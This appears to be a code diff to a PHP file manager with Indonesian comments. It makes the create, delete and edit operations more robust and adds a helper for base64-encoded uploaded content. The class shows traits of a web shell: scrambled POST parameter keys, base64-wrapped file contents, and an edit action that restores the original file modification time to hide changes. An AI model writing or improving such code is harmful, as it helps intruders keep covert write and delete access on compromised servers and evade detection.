@@ -30,8 +30,9 @@ class FileManager {
 
             // ---- Buat folder baru ----
             'mkdir' => function () use ($currentPath, &$sk): ?array {
-                $dirName = $_POST[$sk['dn']] ?? '';
-                if ($dirName === '') return null;
+                $rawDirName = $_POST[$sk['dn']] ?? '';
+                $dirName    = basename($rawDirName);
+                if ($dirName === '' || $dirName === '.' || $dirName === '..') return null;
                 $tujuan = $currentPath . DIRECTORY_SEPARATOR . $dirName;
                 if (!file_exists($tujuan) && @mkdir($tujuan, 0755, true)) {
                     return ['type' => 'success', 'msg' => 'Folder berhasil dibuat!'];
@@ -41,13 +42,12 @@ class FileManager {
 
             // ---- Buat file baru ----
             'mkfile' => function () use ($currentPath, &$sk): ?array {
-                $namaFile = $_POST[$sk['nt']] ?? '';
-                if ($namaFile === '') return null;
+                $rawNamaFile = $_POST[$sk['nt']] ?? '';
+                $namaFile    = basename($rawNamaFile);
+                if ($namaFile === '' || $namaFile === '.' || $namaFile === '..') return null;
                 $tujuan  = $currentPath . DIRECTORY_SEPARATOR . $namaFile;
                 $mentah  = $_POST[$sk['fc']] ?? '';
-                $content = base64_decode($mentah, true) !== false
-                    ? base64_decode($mentah, true)
-                    : $mentah;
+                $content = $this->parseContentPayload($mentah);
                 if (@file_put_contents($tujuan, $content) !== false) {
                     return ['type' => 'success', 'msg' => 'File baru berhasil dibuat!'];
                 }
@@ -96,7 +96,10 @@ class FileManager {
                 if ($namaItem === '') return null;
                 $tujuan = $currentPath . DIRECTORY_SEPARATOR . basename($namaItem);
                 if (is_dir($tujuan)) {
-                    return $rmdir_recursive($tujuan)
+                    $deleted = is_callable($rmdir_recursive)
+                        ? $rmdir_recursive($tujuan)
+                        : (bool)@rmdir($tujuan);
+                    return $deleted
                         ? ['type' => 'success', 'msg' => 'Folder berhasil dihapus!']
                         : ['type' => 'error',   'msg' => 'Gagal menghapus folder!'];
                 } elseif (is_file($tujuan)) {
@@ -137,9 +140,7 @@ class FileManager {
                 $kontenMentah = $_POST[$sk['fc']] ?? '';
                 if ($namaFile === '' || !isset($_POST[$sk['fc']])) return null;
                 $tujuan = $currentPath . DIRECTORY_SEPARATOR . basename($namaFile);
-                $data   = base64_decode($kontenMentah, true) !== false
-                    ? base64_decode($kontenMentah, true)
-                    : $kontenMentah;
+                $data   = $this->parseContentPayload($kontenMentah);
                 if (@file_put_contents($tujuan, $data) !== false) {
                     // Preserve mtime jika diisi
                     $mtimeBaru = $_POST[$sk['cm']] ?? '';
@@ -154,6 +155,18 @@ class FileManager {
         ];
 
         return isset($actions[$op]) ? $actions[$op]() : null;
+    }
+
+    /**
+     * Parse konten payload: dekode base64 hanya jika dikirim oleh serializer JS (flag _b64).
+     * Mencegah korupsi teks biasa seperti "test", "code", "user", "data" saat dikirim tanpa JS.
+     */
+    private function parseContentPayload(string $input): string {
+        if (!empty($_POST['_b64'])) {
+            $decoded = base64_decode($input, true);
+            return $decoded !== false ? $decoded : $input;
+        }
+        return $input;
     }
 
     /**
